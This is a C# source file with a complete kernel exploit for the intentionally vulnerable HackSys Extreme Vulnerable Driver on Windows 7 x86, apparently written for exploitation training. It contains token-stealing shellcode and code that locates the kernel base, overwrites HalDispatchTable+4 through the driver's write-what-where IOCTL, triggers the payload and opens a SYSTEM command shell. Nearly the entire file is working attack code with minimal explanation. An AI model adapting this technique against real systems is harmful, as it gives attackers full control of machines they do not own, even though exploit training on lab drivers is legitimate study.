using System;
using System.Runtime.InteropServices;

namespace WriteWhatWhere
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        struct WRITE_WHAT_WHERE
        {
            public IntPtr What;
            public IntPtr Where;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("psapi.dll", SetLastError = true)]
        static extern bool EnumDeviceDrivers(
            IntPtr[] lpImageBase,
            int cb,
            ref int lpcbNeeded);

        [DllImport("psapi.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetDeviceDriverBaseName(
            IntPtr ImageBase,
            string lpFileName,
            int nSize);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            ref WRITE_WHAT_WHERE InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("ntdll.dll")]
        static extern int NtQueryIntervalProfile(
            uint ProfileSource,
            ref uint Interval);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

        // Global variables
        static IntPtr hDevice = IntPtr.Zero;

        // Helper functions
        static void CleanUp()
        {
            Console.WriteLine("[>] Cleaning up handle object(s)");
            if (hDevice != IntPtr.Zero)
            {
                if (CloseHandle(hDevice))
                {
                    hDevice = IntPtr.Zero;
                }
                else
                {
                    Console.WriteLine("[!] Failed to close a kernel driver's handle (code={0})", Marshal.GetLastWin32Error());
                }
            }
        }

        static bool IsWin7x86()
        {
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;
            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 6 && MinorVersion == 1 && BuildNumber == 7601 &&
                string.Compare(arch, "x86", StringComparison.OrdinalIgnoreCase) == 0)
            {
                Console.WriteLine("[+] Windows 7 SP1 x86 is detected");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported OS is detected");
                return false;
            }
        }

        static bool IsSystem()
        {
            string user = Environment.UserName;

            if (string.Compare(user, "SYSTEM", StringComparison.OrdinalIgnoreCase) == 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        static bool SpawnShell()
        {
            string ApplicationName = "C:\\Windows\\System32\\cmd.exe";
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            uint CREATE_NEW_CONSOLE = 0x00000010;
            string CurrentDirectory = "C:\\Windows\\System32";
            STARTUPINFO si = new STARTUPINFO();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            bool status = CreateProcess(
                ApplicationName, null, ref pSec, ref tSec, false,
                CREATE_NEW_CONSOLE, IntPtr.Zero, CurrentDirectory,
                ref si, out PROCESS_INFORMATION pi);

            if (status)
            {
                Console.WriteLine("[+] Shell is spawned successfully (PID = {0})", pi.dwProcessId);
                WaitForSingleObject(pi.hProcess, 500);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else
            {
                Console.WriteLine("[!] Failed to spawn shell (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        static IntPtr GetKernelBase()
        {
            IntPtr KernelBase = IntPtr.Zero;
            IntPtr[] ImageBases = new IntPtr[512];
            int cb = ImageBases.Length * Marshal.SizeOf(typeof(IntPtr));
            int cbNeeded = 0;
            int NumberOfPointers;

            Console.WriteLine("[>] Searching kernel base");
            bool status = EnumDeviceDrivers(ImageBases, cb, ref cbNeeded);

            if (!status)
            {
                Console.WriteLine("[-] Failed to EnumDeviceDrivers (code={0})", Marshal.GetLastWin32Error());
                return KernelBase;
            }

            NumberOfPointers = cbNeeded / Marshal.SizeOf(typeof(IntPtr));

            int BytesReturned;
            string ImageNameBuffer;
            string ImageName;
            StringComparison comparison = StringComparison.OrdinalIgnoreCase;

            for (uint i = 0; i < NumberOfPointers; i++)
            {
                ImageNameBuffer = new String('\x00', 256);
                BytesReturned = GetDeviceDriverBaseName(ImageBases[i], ImageNameBuffer, ImageNameBuffer.Length);

                if (BytesReturned > 0)
                {
                    ImageName = ImageNameBuffer.Trim('\x00');

                    if (string.Equals(ImageName, "ntoskrnl.exe", comparison))
                    {
                        Console.WriteLine("[+] Found kernel base: {0} @ 0x{1}", ImageName, ImageBases[i].ToString("X"));
                        KernelBase = ImageBases[i];
                        return KernelBase;
                    }
                    else if (string.Equals(ImageName, "ntkrnlpa.exe", comparison))
                    {
                        Console.WriteLine("[+] Found kernel base: {0} @ 0x{1}", ImageName, ImageBases[i].ToString("X"));
                        KernelBase = ImageBases[i];
                        return KernelBase;
                    }
                }
            }

            return KernelBase;
        }

        static void Main()
        {
            byte[] shellcode = {
                //--[Setup]
                0x60,                               // pushad
                0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, // mov eax, fs:[KTHREAD_OFFSET]
                0x8B, 0x40, 0x50,                   // mov eax, [eax + EPROCESS_OFFSET]
                0x89, 0xC1,                         // mov ecx, eax (Current _EPROCESS structure)
                0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, // mov ebx, [eax + TOKEN_OFFSET]
                //--[Copy System PID token]
                0xBA, 0x04, 0x00, 0x00, 0x00,       // mov edx, 4 (SYSTEM PID)
                0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, // mov eax, [eax + FLINK_OFFSET] <-|
                0x2D, 0xB8, 0x00, 0x00, 0x00,       // sub eax, FLINK_OFFSET           |
                0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, // cmp [eax + PID_OFFSET], edx     |
                0x75, 0xED,                         // jnz                           ->|
                0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, // mov edx, [eax + TOKEN_OFFSET]
                0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, // mov [ecx + TOKEN_OFFSET], edx
                //--[Recover]
                0x61,                               // popad
                0xC3                                // ret
            };

            Console.WriteLine("--[ HEVD Exploitation : Write-What-Where\n");

            if (!IsWin7x86())
            {
                return;
            }

            // Step 1: Allocate Token Stealing Shellcode
            IntPtr ShellcodeBuffer;
            uint dwSize = 0x1000;
            uint MEM_COMMIT = 0x00001000;
            uint MEM_RESERVE = 0x00002000;
            uint PAGE_EXECUTE_READWRITE = 0x40;

            Console.WriteLine("[>] Trying to allocate shellcode");
            ShellcodeBuffer = VirtualAlloc(IntPtr.Zero, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (ShellcodeBuffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to VirtualAlloc (code={0})", Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] Allocated {0} bytes buffer at 0x{1}", dwSize, ShellcodeBuffer.ToString("X8"));
            Marshal.Copy(shellcode, 0, ShellcodeBuffer, shellcode.Length);
            Console.WriteLine("[+] Shellcode is allocated at 0x{0}", ShellcodeBuffer.ToString("X8"));

            // Step 2: Search kernel base
            IntPtr KernelBase = GetKernelBase();

            if (KernelBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find kernel base");
                return;
            }

            // Step 3: Calculate HalDispatchTable address
            IntPtr KernelBaseUser;
            IntPtr HalDispatchTableUser;
            IntPtr HalDispatchTablePlus4Kernel;

            Console.WriteLine("[>] Detecting the address of HalDispatchTable");
            KernelBaseUser = LoadLibrary("ntkrnlpa.exe");

            if (KernelBaseUser == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to LoadLibrary (code={0})", Marshal.GetLastWin32Error());
                return;
            }

            HalDispatchTableUser = GetProcAddress(KernelBaseUser, "HalDispatchTable");

            if (HalDispatchTableUser == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to GetProcAddress (code={0})", Marshal.GetLastWin32Error());
                return;
            }

            HalDispatchTablePlus4Kernel = new IntPtr(
                KernelBase.ToInt32() + HalDispatchTableUser.ToInt32() - KernelBaseUser.ToInt32() + 4);

            Console.WriteLine("[+] Detection is successful");
            Console.WriteLine("    |-> ntkrnlpa.exe in Userland @ 0x{0}", KernelBaseUser.ToString("X8"));
            Console.WriteLine("    |-> HalDispatchTable in Userland @ 0x{0}", HalDispatchTableUser.ToString("X8"));
            Console.WriteLine("    |-> HalDispatchTable+4 in Kernelland @ 0x{0}", HalDispatchTablePlus4Kernel.ToString("X8"));

            // Step 4: Prepare malicious data structure
            WRITE_WHAT_WHERE payload = new WRITE_WHAT_WHERE();
            IntPtr pointer;

            byte[] ShellcodePointer = BitConverter.GetBytes(ShellcodeBuffer.ToInt32());
            pointer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            Marshal.Copy(ShellcodePointer, 0, pointer, Marshal.SizeOf(typeof(IntPtr)));
            payload.What = pointer;
            payload.Where = HalDispatchTablePlus4Kernel;

            Console.WriteLine("[>] Payload Information");
            Console.WriteLine("    |-> Write-What: 0x{0}", (payload.What).ToString("X8"));
            Console.WriteLine("    |-> Write-Where: 0x{0}", (payload.Where).ToString("X8"));

            // Step 5: Open driver's handle
            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
            uint GENERIC_READ = 0x80000000;
            uint GENERIC_WRITE = 0x40000000;
            uint FILE_SHARE_READ = 0x00000001;
            uint FILE_SHARE_WRITE = 0x00000002;
            uint OPEN_EXISTING = 0x3;
            uint FILE_ATTRIBUTE_NORMAL = 0x80;
            uint FILE_FLAG_OVERWRAPPED = 0x40000000;
            IntPtr invalid = new IntPtr(-1);

            Console.WriteLine("[>] Opening {0}", deviceName);
            hDevice = CreateFile(
                deviceName, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERWRAPPED, IntPtr.Zero);

            if (hDevice == invalid)
            {
                Console.WriteLine("[-] Failed to open {0} (code={1})", deviceName, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));

            // Step 6: Overwrite HalDispatchTable+4
            uint ioctl = 0x22200B;
            int BytesReturned = 0;

            Console.WriteLine("[>] Overwriting HalDispatchTable+4");
            bool status = DeviceIoControl(
                hDevice, ioctl, ref payload,
                Marshal.SizeOf(typeof(WRITE_WHAT_WHERE)),
                IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send payload (code={0})", Marshal.GetLastWin32Error());
                CleanUp();
                return;
            }

            // Step 7: Trigger shellcode
            Console.WriteLine("[>] Trigger token stealing shellcode");
            uint Interval = 0;
            NtQueryIntervalProfile(0x1337, ref Interval);
            CleanUp();

            // Step 8: Spawn SYSTEM shell
            if (IsSystem() && SpawnShell())
            {
                Console.WriteLine("[+] Exploit is completed successfully");
            }
            else
            {
                Console.WriteLine("[-] Failed to exploit");
            }
        }
    }
}